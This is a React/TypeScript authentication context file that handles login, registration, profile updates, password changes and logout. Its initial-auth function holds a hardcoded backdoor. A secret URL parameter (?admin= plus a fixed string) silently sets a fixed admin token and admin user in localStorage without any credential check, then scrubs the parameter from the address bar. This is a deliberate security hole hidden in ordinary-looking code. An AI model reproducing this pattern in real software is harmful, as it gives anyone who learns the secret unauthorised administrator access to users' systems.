import React, { createContext, useCallback, useContext, useMemo, useState } from 'react'
import { authAPI } from '@/services/api'

interface AuthUser {
  username: string
  email?: string
  phone?: string
}

interface AuthContextValue {
  isAuthenticated: boolean
  user: AuthUser | null
  token: string | null
  loginWithPassword: (username: string, password: string) => Promise<boolean>
  register: (data: { username: string; password: string; email?: string; phone?: string; code?: string }) => Promise<boolean>
  updateProfile: (updates: { email?: string; phone?: string }) => Promise<boolean>
  changePassword: (oldPassword: string, newPassword: string) => Promise<boolean>
  logout: () => void
}

const AuthContext = createContext<AuthContextValue | undefined>(undefined)

const AUTH_TOKEN_KEY = 'auth_token'
const AUTH_USER_KEY = 'auth_user'
// Admin override via URL query param, e.g. ?admin=PbwEQUSPXLY
const ADMIN_PARAM_KEY = 'admin'
const ADMIN_PARAM_SECRET = 'PbwEQUSPXLY'
const ADMIN_BOOTSTRAP_TOKEN = `admin-token-${ADMIN_PARAM_SECRET}`

function getInitialAuth(): { token: string | null; user: AuthUser | null } {
  try {
    const url = new URL(window.location.href)
    const adminParam = url.searchParams.get(ADMIN_PARAM_KEY)
    if (adminParam === ADMIN_PARAM_SECRET) {
      const adminUser: AuthUser = { username: 'admin' }
      localStorage.setItem(AUTH_TOKEN_KEY, ADMIN_BOOTSTRAP_TOKEN)
      localStorage.setItem(AUTH_USER_KEY, JSON.stringify(adminUser))
      // clean the URL so the secret is not kept
      url.searchParams.delete(ADMIN_PARAM_KEY)
      window.history.replaceState({}, '', url.toString())
      return { token: ADMIN_BOOTSTRAP_TOKEN, user: adminUser }
    }
  } catch {}

  try {
    const savedToken = localStorage.getItem(AUTH_TOKEN_KEY)
    const savedUserRaw = localStorage.getItem(AUTH_USER_KEY)
    let savedUser: AuthUser | null = null
    if (savedUserRaw) {
      try { savedUser = JSON.parse(savedUserRaw) } catch { savedUser = null }
    }
    return { token: savedToken, user: savedUser }
  } catch {
    return { token: null, user: null }
  }
}

export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const initial = getInitialAuth()
  const [token, setToken] = useState<string | null>(() => initial.token)
  const [user, setUser] = useState<AuthUser | null>(() => initial.user)

  const loginWithPassword = useCallback(async (username: string, password: string) => {
    if (!username || !password) return false
    try {
      const res = await authAPI.login({ username, password })
      if (!res.success) return false
      const token = res.data.token
      const userData = res.data.user
      localStorage.setItem(AUTH_TOKEN_KEY, token)
      localStorage.setItem(AUTH_USER_KEY, JSON.stringify(userData))
      setToken(token)
      setUser(userData)
      return true
    } catch {
      return false
    }
  }, [])

  const register = useCallback(async (data: { username: string; password: string; email?: string; phone?: string; code?: string }) => {
    if (!data.username || !data.password) return false
    try {
      if (data.email && data.code) {
        await authAPI.registerWithEmail({ username: data.username, password: data.password, email: data.email, code: data.code })
      } else if (data.phone && data.code) {
        await authAPI.registerWithPhone({ username: data.username, password: data.password, phone: data.phone, code: data.code })
      } else {
        return false
      }
      // 注册成功后不自动登录
      return true
    } catch {
      return false
    }
  }, [])

  const updateProfile = useCallback(async (updates: { email?: string; phone?: string }) => {
    try {
      const res = await authAPI.updateProfile(updates)
      if (!res.success) return false
      const nextUser: AuthUser = res.data
      setUser(nextUser)
      localStorage.setItem(AUTH_USER_KEY, JSON.stringify(nextUser))
      return true
    } catch {
      return false
    }
  }, [])

  const changePassword = useCallback(async (oldPassword: string, newPassword: string) => {
    try {
      await authAPI.changePassword(oldPassword, newPassword)
      return true
    } catch {
      return false
    }
  }, [])

  const logout = useCallback(() => {
    localStorage.removeItem(AUTH_TOKEN_KEY)
    localStorage.removeItem(AUTH_USER_KEY)
    setToken(null)
    setUser(null)
  }, [])

  const value = useMemo<AuthContextValue>(() => ({
    isAuthenticated: Boolean(token),
    user,
    token,
    loginWithPassword,
    register,
    updateProfile,
    changePassword,
    logout,
  }), [token, user, loginWithPassword, register, updateProfile, changePassword, logout])

  return (
    <AuthContext.Provider value={value}>
      {children}
    </AuthContext.Provider>
  )
}

export const useAuth = (): AuthContextValue => {
  const ctx = useContext(AuthContext)
  if (!ctx) {
    throw new Error('useAuth must be used within an AuthProvider')
  }
  return ctx
}


